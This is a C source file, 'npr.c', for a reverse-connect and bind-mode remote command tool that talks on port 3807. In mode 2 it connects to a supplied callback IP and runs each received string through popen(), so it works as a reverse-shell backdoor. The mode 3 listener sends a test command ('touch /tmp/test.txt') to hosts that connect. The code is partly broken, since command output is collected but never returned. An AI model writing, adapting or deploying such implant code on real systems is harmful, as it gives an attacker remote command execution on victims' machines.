#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h> 

// compile and run using IP of cnet.com
// clear && gcc npr.c -o npr -lpcap && chmod 777 npr && ./npr 2 127.0.0.1
// clear && gcc npr.c -o npr -lpcap && chmod 777 npr && ./npr 3

int main(int argc, char *argv[]) {
    int sockfd = 0, n = 0, listenfd = 0, connfd = 0;
    char recvBuff[1024];
    char sendBuff[1025];
    int nport = 3807;
    struct sockaddr_in serv_addr; 
    // npr 1            # mode one, client nopro only <- np, no socket
    // npr 2 callbackip # mode two, router reverse <- np, connect socket
    // npr 3            # mode three, router bind <- listen socket
    if(argc < 2) {
        printf("\nUsage: %s <mode> (ip of server)\n",argv[0]);
        return 1;
    }
    if (strncmp(argv[1],"2",1) == 0) { // connect socket
		if(argc != 3) {
			printf("\nMode 2 Usage: %s <mode> (ip of server)\n",argv[0]);
			return 1;
		}
    	printf("Mode 2 Connecting to %s:%u\n", argv[2], nport);
		memset(recvBuff, '0',sizeof(recvBuff));
		if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
			printf("\nError : Could not create socket \n");
			return 1;
		} 
		memset(&serv_addr, '0', sizeof(serv_addr)); 
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_port = htons(nport); 
		if(inet_pton(AF_INET, argv[2], &serv_addr.sin_addr)<=0) {
			printf("\ninet_pton error occured\n");
			return 1;
		} 
		if(connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		   printf("\nError : Connect Failed \n");
		   return 1;
		} 
		snprintf(sendBuff, sizeof(sendBuff), "%.24s\r\n","GET / HTTP/1.0\n\n");
		write(sockfd, sendBuff, strlen(sendBuff));
		while ( (n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
			recvBuff[n] = 0; // null terminate so that we can pass this string to other functions later
			if(fputs(recvBuff, stdout) == EOF) {
				printf("\nError : Fputs error\n");
			}
			int messagebuilder = 0;
			char message[50000];
			char bfr[50000];
			FILE * fp;
			if((fp=popen((const char *)recvBuff, "r")) == NULL) {
			   //-----printf("Error executing command buffer\n");
			}
			message[messagebuilder] = '\x0A'; // prepend with a newline for good formatting on shell responses
			messagebuilder++;
			while(fgets(bfr,50000,fp) != NULL){
				int sure;
				int bfrlen;
				bfrlen = strlen((const char *)bfr);
				for (sure = 0; sure < bfrlen; sure++) {
					message[messagebuilder] = bfr[sure];
					messagebuilder++;
				}
			}
			message[messagebuilder] = 0;
		} 
		if(n < 0) {
			printf("\nRead error \n");
		}
    }
    else if (strncmp(argv[1],"3",1) == 0) { // listen socket
    	printf("Mode 3 Listening\n");
		listenfd = socket(AF_INET, SOCK_STREAM, 0);
		memset(&serv_addr, '0', sizeof(serv_addr));
		memset(sendBuff, '0', sizeof(sendBuff)); 
		serv_addr.sin_family = AF_INET;
		serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		serv_addr.sin_port = htons(nport); 
		if (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0) {
			printf("bind() failed\n");
			return 1;
		}
		if (listen(listenfd, 10) != 0) {
			printf("listen() failed\n");
			return 1;
		}
    	printf("Bound to ANY:%u\n", nport);
		while(1) {
			connfd = accept(listenfd, (struct sockaddr*)NULL, NULL); 
	    	printf("Host Connected\n");
			//while ( (n = read(connfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
	    	if ( (n = read(connfd, recvBuff, sizeof(recvBuff)-1)) > 0) {
				recvBuff[n] = 0;
				if(fputs(recvBuff, stdout) == EOF) {
					printf("\nError : Fputs error\n");
				}
			} 
	    	snprintf(sendBuff, sizeof(sendBuff), "%.24s", "touch /tmp/test.txt");
			write(connfd, sendBuff, strlen(sendBuff)); 
			close(connfd);
			sleep(1);
		}
    }
    return 0;
}
